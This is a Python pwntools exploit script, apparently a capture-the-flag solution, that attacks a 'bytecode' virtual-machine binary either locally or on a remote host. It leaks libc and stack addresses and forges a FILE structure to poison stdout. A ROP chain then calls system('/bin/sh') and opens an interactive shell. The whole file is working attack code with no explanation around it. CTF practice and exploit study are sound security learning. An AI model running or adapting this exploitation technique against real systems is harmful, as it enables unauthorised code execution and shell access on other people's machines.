from pwn import *
import sys
from ctypes import CDLL

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./bytecode"        ### CHANGE ME !!!!!!!!!!!!!!!!
gdbscript = '''
    b *main+502
'''

# libcx = CDLL("libc.so.6")
# now = int(floor(time.time()))
# libcx.srand(now)
# print(libcx.rand())

def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

class inst:
    add = 0
    sub = 1
    div = 2
    mul = 3
    andx = 4
    xor = 5
    orx = 6
    push = 7
    pop = 8
    prt = 9
    puts = 10
    dec = 11
    inc = 12
    lea = 13
    nop = 14
    halt = 15

def unpack_ptr(packed_addr):
    if (len(packed_addr) < 8):
        packed_addr += (8 - len(packed_addr)) * b'\x00'
        return (u64(packed_addr))


def  populate_stack(pop_size):
    aligned_payload = (pop_size // 9 + 1) * 9
    payloads = (aligned_payload // 8 + 1)
    for i in range(payloads):
        pp.recvuntil(b">>")
        payload = (p8(inst.push) + b"workhors")
        pp.sendline(payload)
    log.info("stck")

def leak_libc():
    pp.recvuntil(b">> ")
    log.info(f"leaking libc base")
    log.info(f"reading stdout from {hex(elf.bss(0x0))}")
    payload = p8(inst.puts) + p64(elf.bss(0x0)) 
    pp.sendline(payload)
    leak = unpack_ptr(pp.recvuntil(b">> ").replace(b">>", b"").rstrip())
    log.info(f"stdout {libc.sym.stdout}")
    stdout = 1938880
    if (args.REMOTE):
        stdout = 2115008
    libc_base = leak - stdout
    log.info(f"libc base {hex(libc_base)}")
    return (libc_base)

def leak_retaddr():
    base_stack = 0x404060
    pp.sendline(p8(inst.nop))
    populate_stack(4096)
    pp.recvuntil(b">> ")
    pp.sendline(p8(inst.puts) + p32(0x4040ff))
    leak = pp.recvuntil(b">>").replace(b'>>', b"").rstrip()
    stack_offset = -4120           # this is approximite
    stack = (unpack_ptr(leak[leak.rfind(b"workhors") + 8::]) - stack_offset)
    log.info(f"stack retaddr {hex(stack)}")
    return (stack) 

def craft_fakefile(libc_base, retaddr_leak):
    lock_offset = 1943312
    if (args.REMOTE):
        lock_offset = 2119456

    fake_file = FileStructure(0x0)
    fake_file.flags = 0xfbad2084
    fake_file.vtable = libc.sym._IO_file_jumps + libc_base
    fake_file._lock = lock_offset + libc_base
    fake_file._IO_write_base = retaddr_leak - 100
    fake_file._IO_write_ptr = retaddr_leak
    fake_file._IO_write_end = retaddr_leak + 100
    # fake_file._fileno = 1

    return (bytes(fake_file))

def split_to_chunks(strx, x):
    res=[strx[y-x:y] for y in range(x, len(strx)+x,x)]
    return (res)

def inject_data(data):
    chunks = split_to_chunks(data, 8)
    chunks.reverse()
    for chunk in chunks:
        pp.recvuntil(b">> ")
        pp.sendline(p8(inst.push) + chunk)

def exploit():
    log.info("binary loaded")

    stack_bss = elf.bss() + 0x40
    libc_base = leak_libc()
    stack_addr = leak_retaddr()

    pp.sendline(p8(inst.nop))
    ffile = craft_fakefile(libc_base, stack_addr)
    inject_data(ffile)
    pp.sendline(p8(inst.nop))
    log.info(f"Fake FILE live in {hex(stack_bss + 8 * 4)}")
    ffile_offset = stack_bss 

    log.info("poisonning bss stdout")
    log.info("writing gadgets")
    gadgets = flat(
            libcrops.rdi.address + libc_base,
            next(libc.search(b"/bin/sh\x00")) + libc_base,
            libcrops.rdi.address + libc_base + 1,
            libc.sym.system + libc_base,
            0
            )
    pp.recvuntil(b">>")
    pp.sendline(p8(inst.lea) + p64(elf.bss(0x0)) + p64(ffile_offset) + p8(inst.prt) + p8(8 * 4) + gadgets)
    log.info("exiting main")

    pp.interactive()

if (args.REMOTE):
    libc = ELF("./libc.so.6")
else:
    libc = ELF("/usr/lib/libc.so.6")
    # libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)

pp = init()
exploit()
